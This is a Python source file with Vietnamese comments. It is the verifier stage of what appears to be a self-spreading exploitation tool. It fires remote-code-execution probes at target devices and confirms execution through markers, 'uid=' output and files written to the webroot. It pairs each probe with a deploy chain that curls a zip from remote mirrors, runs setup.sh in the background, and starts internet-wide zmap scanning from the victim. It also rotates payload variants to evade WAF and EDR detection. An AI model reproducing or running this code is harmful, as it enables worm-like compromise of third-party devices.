# -*- coding: utf-8 -*-
"""
Giai đoạn 3: Verifier — xác nhận RCE sau khi exploit module bắn thành công.

QUY ƯỚC TỪ NÂNG CẤP (2026-09): exploit module trả về TUPLE
    (status, headers, body) | None
thay vì body string cũ. `_as_response()` chuẩn hoá cả 2 dạng (tuple mới /
str cũ — tương thích ngược) về (status, headers, body).

Cơ chế xác nhận (non-blind):
  * Response 3xx (redirect)        → VULN_NO_EXEC — chặn reflection qua
    redirect: Location chứa tag/uid= không bao giờ được coi là bằng chứng RCE.
  * BẮT BUỘC có `uid=` (output lệnh `id`) VÀ tag MARKER_ trong body
                                    → RCE_CONFIRMED
  * Chỉ có tag (không có uid=)     → VULN_NO_EXEC — reflection (dương giả cũ)
  * Chỉ có uid= (không có tag)     → RCE_PROBABLE (lệnh chạy, output bị cắt)
  * exploit trả None               → NO_RESPONSE (mất kết nối / lỗi transport)

Cơ chế xác nhận (blind):
  * Ghi marker ra webroot (`echo TAG > <root>marker_<rand>.txt`) rồi GET lại.
  * SO KHỚP CHÍNH XÁC: body GET được phải bằng đúng tag (`fetched.strip() == tag`)
    — fix dương giả cũ khi dùng substring trên trang bị sửa nội dung.

Chống bỏ sót / WAF / EDR / webroot:
  * Multi-attempt: thử lần lượt nhiều biến thể payload (gốc → ${IFS}/keyword-split
    → base64-wrap) khi kết quả NO_RESPONSE/VULN_NO_EXEC — né WAF signature.
  * WAF detect qua evasion.waf_detect(status, headers, body) — ghi chú waf vào
    finding thay vì kết luận nhầm "hết lỗ hổng".
  * EDR_OBFUSCATE: chuỗi deploy được bọc base64 (evasion.edr_wrap).
  * Tìm webroot động:
      - HTTP-derived: Location header, src=/href=/action= trong body.
      - RCE-derived : lệnh `find` chạy qua RCE (module non-blind) → danh sách
        thư mục chứa index.html/index.htm thật trên thiết bị.
      - Device-aware: DEVICE_WEBROOTS theo loại thiết bị fingerprint.
"""

import logging
import random
import re
import time
from urllib.parse import quote

from config import (
    DEPLOY_SHA256,
    DEPLOY_URLS,
    DEVICE_WEBROOTS,
    EDR_OBFUSCATE,
    EVASION_MODE,
    EXPLOIT_INJECT_VARIANTS,
    EXPLOIT_MAX_ATTEMPTS,
    EXPLOIT_PROBE_VARIANTS,
    MAX_HTTP_PARSE,
    TIMEOUT,
    VERIFIER_DEPLOY,
    WEBROOT_CANDIDATES,
)
import evasion
import exploits.deploy as deploy_mod
import exploits.inject as inject_mod
import exploits.payloads as payloads
from exploits.common import rand_tag
from scanner import http_get

log = logging.getLogger("sofia.verifier")

# Các trạng thái kết luận
RCE_CONFIRMED = "RCE_CONFIRMED"
RCE_PROBABLE = "RCE_PROBABLE"
VULN_NO_EXEC = "VULN_NO_EXEC"   # module bắn được nhưng chưa chứng minh được exec
NO_RESPONSE = "NO_RESPONSE"
FINGERPRINT_ONLY = "FINGERPRINT_ONLY"  # không có PoC an toàn — chỉ ghi nhận fingerprint
CONFIRMED = "CONFIRMED"  # xác nhận deterministic (không phải RCE exec — vd: lộ credential/auth bypass)

# Regex lấy đường dẫn từ body (src/href/action) để suy webroot
_PATH_RE = re.compile(r'(?:src|href|action)\s*=\s*["\']?/([^"\'/ >?#]+)')


def _clean(text, limit=400):
    """Rút gọn văn bản dùng làm evidence, thay dòng mới để ghi 1 dòng JSON."""
    if text is None:
        return ""
    text = " ".join(str(text).split())
    return text[:limit]


def _as_response(res):
    """
    Chuẩn hoá kết quả exploit module về (status, headers, body):
      - tuple   (status, headers, body)  → giữ nguyên (hợp đồng mới)
      - str                              → (None, {}, str)  (body trần, cũ)
      - None                             → None
    Trả về None khi không có phản hồi (lỗi transport / không khai thác được).
    """
    if res is None:
        return None
    if isinstance(res, tuple):
        status, headers, body = (list(res) + [None, None, None])[:3]
        return status, (headers or {}), (body or "")
    return None, {}, (res or "")


def _build_deploy_cmd():
    """
    Chuỗi deploy ĐA HÌNH — ưu tiên cơ chế mới `exploits.deploy` (P1 OPSEC +
    độ bền cao): nhiều mirror, fallback tải (curl→wget→busybox→python),
    kiểm tra kích thước + SHA-256 đa công cụ, giải nén đa công cụ, dò thư mục
    vào, và đóng gói base64/plain.

    Fallback (tương thích ngược) về chuỗi legacy khi cơ chế mới không hoạt
    động (config.DEPLOY_URLS trống) — giữ nguyên hành vi cũ.
    """
    try:
        if deploy_mod.is_active():
            cmd = deploy_mod.build_deploy_command()
            if cmd:
                return cmd
    except Exception as exc:                        # noqa: BLE001 — không chặn deploy
        log.debug("exploits.deploy lỗi, quay về legacy: %s", exc)

    # ── Legacy fallback (tương thích ngược) ─────────────────────────────
    if not DEPLOY_URLS:
        return VERIFIER_DEPLOY
    url = random.choice(DEPLOY_URLS)
    fname = "s" + rand_tag(6) + ".zip"
    parts = ["cd /tmp"]
    parts.append("curl -fsSL -o %s %s" % (fname, url))
    if DEPLOY_SHA256:
        parts.append('echo "%s  %s" | sha256sum -c -' % (DEPLOY_SHA256, fname))
    parts.append("unzip -oq %s" % fname)
    parts.append("rm -f %s" % fname)
    parts.append("cd sofia_scan && bash setup.sh")
    parts.append("(sudo -n python3 main.py --generate-ipv4 --engine zmap || "
                 "python3 main.py --generate-ipv4 --engine zmap)")
    return "nohup sh -c '%s' >/dev/null 2>&1 &" % " && ".join(parts)


def _deploy_variants():
    """
    Sinh biến thể deploy cho verifier xoay vòng:
      * ưu tiên `exploits.deploy.build_deploy_variants()` khi cơ chế mới hoạt
        động (đã tự sinh bản base64 + plain).
      * fallback `evasion.deploy_variants()` (gốc / ${IFS}+split / base64) khi
        dùng chuỗi legacy.
    """
    try:
        if deploy_mod.is_active():
            vs = deploy_mod.build_deploy_variants()
            if vs:
                return vs
    except Exception as exc:                        # noqa: BLE001
        log.debug("exploits.deploy variants lỗi: %s", exc)
    return evasion.deploy_variants(_build_deploy_cmd(), edr=EDR_OBFUSCATE)


def build_probe(device=""):
    """
    Lệnh probe ĐƠN LẺ (tương thích ngược): nonce số học + chuỗi deploy.
    Command = `<probe>; <deploy>`; probe là `echo MARKER_<rand>_$((A*B))`.
    Trả về (cmd, tag, deploy_used).
    """
    spec = payloads.build_probes(max_variants=1)[0]
    variants = _deploy_variants()
    deploy = variants[0]
    if EVASION_MODE and len(variants) > 1:
        deploy = random.choice(variants)
    cmd = payloads.compose(spec["cmd"], deploy)
    return cmd, spec["tag"], deploy


def build_attempts(func=None, info=None, device="", max_total=None):
    """
    Sinh danh sách biến thể (cmd, tag, expect) để xác nhận RCE:
      * probe  : nonce số học (payloads.build_probes) — chống reflection,
                 KHÔNG phụ thuộc `id`/`uid=` (bằng chứng độc lập, chắc hơn).
      * deploy : _deploy_variants() (đa hình: plain/base64, nhiều mirror).
      * verbatim: module nhồi lệnh thô → bọc thêm ranh giới inject
                 (inject.wrap_variants) để thoát ngữ cảnh tham số.
    Dừng khi đủ max_total (@EXPLOIT_MAX_ATTEMPTS) — chặn nổ traffic.
    """
    try:
        max_total = int(max_total) if max_total else int(EXPLOIT_MAX_ATTEMPTS)
    except (TypeError, ValueError):
        max_total = 8
    try:
        probe_n = max(1, int(EXPLOIT_PROBE_VARIANTS))
    except (TypeError, ValueError):
        probe_n = 3
    try:
        inject_n = max(1, int(EXPLOIT_INJECT_VARIANTS))
    except (TypeError, ValueError):
        inject_n = 3

    specs = payloads.build_probes(max_variants=probe_n)
    deploys = _deploy_variants() or [""]
    verbatim = inject_mod.needs_inject_matrix(func, info)
    out = []
    for i, spec in enumerate(specs):
        deploy = deploys[i % len(deploys)]
        composed = payloads.compose(spec["cmd"], deploy)
        cmds = (inject_mod.wrap_variants(composed, inject_n)
                if verbatim else [composed])
        for c in cmds:
            out.append((c, spec["tag"], spec["expect"]))
            if len(out) >= max_total:
                return out
    return out


# ── Tìm webroot động ────────────────────────────────────────────────────
def discover_webroots_http(status, headers, body):
    """
    Suy webroot từ response HTTP (không cần thêm request):
      - Location header (redirect) → thư mục gốc.
      - src=/href=/action= path trong body → thư mục chứa tài nguyên.
    Trả về list đường dẫn (đã dedupe, có trailing slash).
    """
    roots = []
    seen = set()
    loc = (headers or {}).get("location", "")
    if loc.startswith("/") and not loc.startswith("//"):
        seg = loc.split("/")[1]
        if seg and not seg.endswith("."):
            roots.append("/" + seg + "/")
            seen.add("/" + seg + "/")
    body_s = (body or "")[:MAX_HTTP_PARSE]
    for m in _PATH_RE.findall(body_s):
        path = "/" + m + "/"
        if path not in seen:
            roots.append(path)
            seen.add(path)
        if len(roots) >= 12:            # giới hạn, tránh nhiễu
            break
    return roots


def discover_webroots_rce(func, host, port, timeout):
    r"""
    Tìm webroot qua RCE (module non-blind — output lệnh hồi về):
    `find / -maxdepth 6 \( -name index.html -o -name index.htm \) 2>/dev/null`
    → suy thư mục gốc thật trên thiết bị. Trả về list đường dẫn.
    """
    find_cmd = ("find / -maxdepth 6 \\( -name index.html -o -name index.htm \\) "
                "2>/dev/null | head -20")
    try:
        res = func(host, port, timeout, find_cmd)
    except Exception:
        return []
    resp = _as_response(res)
    if resp is None:
        return []
    body = resp[2]                       # (status, headers, body) — body string
    roots, seen = [], set()
    for line in (body or "").splitlines():
        line = line.strip()
        if not line.startswith("/"):
            continue
        seg = line.split("/")[1]
        path = "/" + seg + "/"
        if path not in seen:
            roots.append(path)
            seen.add(path)
        if len(roots) >= 8:
            break
    if roots:
        log.debug("RCE-find webroot %s:%d → %s", host, port, roots)
    return roots


def build_webroot_list(device="", http_hints=None, rce_hints=None):
    """
    Hợp nhất webroot: static (WEBROOT_CANDIDATES) + theo thiết bị
    (DEVICE_WEBROOTS) + động (HTTP-derived, RCE-derived). Dedupe, giữ thứ tự.
    """
    merged = []
    seen = set()
    for group in (WEBROOT_CANDIDATES,
                  DEVICE_WEBROOTS.get("unknown", []),
                  DEVICE_WEBROOTS.get(device, []) if device else [],
                  http_hints or [],
                  rce_hints or []):
        for root in group:
            if not root:
                continue
            root = root if root.endswith("/") else root + "/"
            if root not in seen:
                merged.append(root)
                seen.add(root)
    return merged


def _send_probe(func, host, port, cmd, timeout):
    """Gọi exploit module. Trả về tuple|str|None (để nguyên, chưa chuẩn hoá)."""
    try:
        return func(host, port, timeout, cmd)
    except Exception as exc:          # module lỗi → coi như không phản hồi
        log.debug("Exploit %s:%d raise %r", host, port, exc)
        return None


def _http_get_text(host, port, path, timeout):
    """GET http và trả body text; None nếu lỗi."""
    status, _hdrs, body = http_get(host, port, path, timeout)
    return body if status else None


def check_blind(func, host, port, tag, timeout, webroots):
    """
    Xác nhận RCE cho module blind: ghi marker vào từng webroot (static +
    device + phát hiện động) rồi GET lại đường dẫn tương ứng.
    SO KHỚP CHÍNH XÁC: body GET được phải bằng đúng tag (strip) — không dùng
    substring (chống dương giả khi webroot trả trang nội dung bị chèn tag).
    Trả về (status, evidence_path, out_cmd).
    """
    fname = tag.lower() + ".txt"
    for root in webroots:
        path = root.rstrip("/") + "/" + fname
        write_cmd = "echo %s > %s" % (tag, path)
        res = _send_probe(func, host, port, write_cmd, timeout)
        if res is None:
            continue                       # lần ghi này lỗi transport → thử webroot khác
        # Thử GET file qua 2 dạng path: có webroot và bỏ webroot
        url_root = quote(path.lstrip("/"))
        fetched = _http_get_text(host, port, "/" + url_root, timeout)
        if fetched is not None and fetched.strip() == tag:
            # Dọn dấu vết (blind — không quan trọng lắm nếu rm không chạy)
            _send_probe(func, host, port, "rm -f %s" % path, timeout)
            return RCE_CONFIRMED, path, write_cmd
    return VULN_NO_EXEC, "", ""


def _waf_from_response(status, headers, body):
    """
    Detect WAF từ status + headers + body (evasion.waf_detect).
    Trả về tên WAF (chuỗi rỗng nếu không phát hiện).
    """
    name = evasion.waf_detect(status, headers or {}, body or "")[1]
    return name or ""


def verify(host, port, cve_id, info, timeout=TIMEOUT):
    """
    Xác nhận RCE cho 1 cặp (host, cve). `info` là metadata registry của CVE:
        {"func": callable, "blind": bool, "fingerprint_only": bool, ...}

    Multi-attempt: nếu lần đầu NO_RESPONSE/VULN_NO_EXEC và EVASION_MODE bật,
    thử lại với biến thể payload khác (tối đa RETRY_ATTEMPTS lần).
    Trả về dict kết quả (luôn JSON-serializable).
    """
    start = time.time()
    func = info["func"]
    blind = bool(info.get("blind", False))
    device = str(info.get("device", "")).lower()
    confirm_subs = info.get("confirm") or []   # module deterministic: chuỗi chứng minh trong body
    _want_hint = ("chuỗi xác nhận %r" % confirm_subs) if confirm_subs else "marker nonce/'uid='"

    result = {
        "cve": cve_id, "host": host, "port": port,
        "status": VULN_NO_EXEC, "evidence": "",
        "tag": "", "elapsed": round(time.time() - start, 2),
        "attempts": 0, "waf": "",
    }

    if info.get("fingerprint_only"):
        return {
            "cve": cve_id, "host": host, "port": port,
            "status": FINGERPRINT_ONLY, "evidence": "Module fingerprint_only — chưa có "
            "payload PoC an toàn, không gọi verifier.",
            "elapsed": round(time.time() - start, 2),
        }

    # Chuẩn bị biến thể probe: nonce số học × deploy đa hình × ranh giới inject.
    attempts = build_attempts(func, info, device)
    if not attempts:                    # phòng hờ: luôn có ít nhất 1 lần thử
        cmd, tag, _deploy = build_probe(device)
        attempts = [(cmd, tag, "")]

    last_resp = None          # (status, headers, body) chuẩn hoá — lần cuối
    last_body = ""
    last_3xx = False
    last_waf = ""
    confirmed_tag = ""
    last_expect = ""
    for idx, (cmd, tag, expect) in enumerate(attempts):
        res = _send_probe(func, host, port, cmd, timeout)
        result["attempts"] = idx + 1
        confirmed_tag = tag
        last_expect = expect

        if blind:
            resp = _as_response(res)
            if resp is None:
                result["status"] = NO_RESPONSE
                # Nghi WAF chặn kết nối? thử biến thể khác
                continue
            status, headers, body = resp
            last_resp = resp
            last_body = body
            http_hints = discover_webroots_http(status, headers, body)
            webroots = build_webroot_list(device, http_hints=http_hints)
            waf_name = _waf_from_response(status, headers, body)
            if waf_name:
                last_waf = waf_name
            status_b, path, write_cmd = check_blind(func, host, port, tag, timeout, webroots)
            result["status"] = status_b
            result["evidence"] = ("Blind-check: ghi marker %s → %s (webroots: %s)"
                                  % (tag, path, ", ".join(webroots[:5]))
                                  if status_b == RCE_CONFIRMED else
                                  "Module blind bắn OK (HTTP) nhưng không tìm thấy "
                                  "marker trong %d webroot thử." % len(webroots))
            result["tag"] = tag
            result["waf"] = last_waf
            return result

        # Non-blind: phân tích output trả về
        resp = _as_response(res)
        if resp is None:
            result["status"] = NO_RESPONSE
            continue                        # thử biến thể khác
        last_resp = resp
        status, headers, body = resp
        last_body = body
        waf_name = _waf_from_response(status, headers, body)
        if waf_name:
            last_waf = waf_name

        # 3xx = redirect — chặn mọi kết luận RCE từ phản hồi loại này
        if status is not None and 300 <= int(status) < 400:
            last_3xx = True
            result["status"] = VULN_NO_EXEC
            continue                        # reflection redirect — không confirm

        # Module deterministic (trường "confirm"): khớp substring trong body chứng
        # minh luồng khai thác (vd: lộ credential / auth bypass) mà KHÔNG cần
        # output lệnh `id`. Ưu tiên trước logic tag/uid=.
        if confirm_subs:
            matched = [s for s in confirm_subs if s in body]
            if matched:
                result["status"] = CONFIRMED
                result["evidence"] = ("Xác nhận deterministic (khớp '%s'): %s"
                                      % (matched[0], _clean(body)))
                result["tag"] = tag
                result["waf"] = last_waf
                return result
            result["status"] = VULN_NO_EXEC   # phản hồi về nhưng không khớp chuỗi
            continue                          # thử biến thể khác nếu còn lượt

        # Phân loại bằng chứng qua payloads.classify:
        #   confirmed  = nonce ĐÃ TÍNH (exec chắc chắn) HOẶC tag + 'uid='
        #   probable   = chỉ 'uid=' (output bị cắt/không thấy tag)
        #   reflection = tag có nhưng KHÔNG nonce-tính, KHÔNG 'uid=' (phản chiếu)
        verdict = payloads.classify(body, tag, expect)
        if verdict == "confirmed":
            result["status"] = RCE_CONFIRMED
            if expect and expect in body:
                result["evidence"] = ("Nonce số học đã tính trong output (exec chắc chắn): "
                                      + _clean(body))
            else:
                result["evidence"] = "Output lệnh hồi về (có 'uid=' + marker): " + _clean(body)
            result["tag"] = tag
            result["waf"] = last_waf
            return result
        if verdict == "probable":            # 'uid=' nhưng tag bị cắt → probable
            result["status"] = RCE_PROBABLE
            result["evidence"] = "Có 'uid=' trong response (lệnh chạy, output bị cắt): " + _clean(body)
            result["tag"] = tag
            result["waf"] = last_waf
            return result
        if verdict == "reflection":          # tag có nhưng KHÔNG có uid=/nonce → phản chiếu
            result["status"] = VULN_NO_EXEC
            continue
        # none — thử biến thể khác nếu còn lượt

    # Hết lượt: kết luận theo dữ liệu cuối cùng
    result["tag"] = confirmed_tag
    result["waf"] = last_waf
    if last_resp is None:
        result["status"] = NO_RESPONSE
        result["evidence"] = ("Không phản hồi sau %d lần thử (có thể WAF chặn/"
                              "thiết bị mất kết nối)." % result["attempts"])
    elif last_3xx:
        result["status"] = VULN_NO_EXEC
        result["evidence"] = ("Response 3xx (reflection redirect bị chặn) sau %d lần "
                              "thử — không xác nhận RCE." % result["attempts"])
    elif result["status"] == VULN_NO_EXEC and last_waf:
        result["evidence"] = ("HTTP phản hồi nhưng không thấy %s sau %d lần "
                              "thử — nghi WAF chặn payload (%s): %s"
                              % (_want_hint, result["attempts"], last_waf, _clean(last_body)))
    elif result["status"] == VULN_NO_EXEC:
        result["evidence"] = ("HTTP phản hồi nhưng không thấy %s sau %d lần "
                              "thử (%s): %s"
                              % (_want_hint, result["attempts"],
                                 "tag-only = nghi reflection; đã thử biến thể payload khác nhau"
                                 if not confirm_subs else
                                 "module deterministic — không có chuỗi xác nhận nào khớp",
                                 _clean(last_body)))
    return result


__all__ = [
    "RCE_CONFIRMED", "RCE_PROBABLE", "VULN_NO_EXEC", "NO_RESPONSE",
    "FINGERPRINT_ONLY", "CONFIRMED", "build_probe", "build_attempts",
    "check_blind", "verify",
    "discover_webroots_http", "discover_webroots_rce", "build_webroot_list",
]



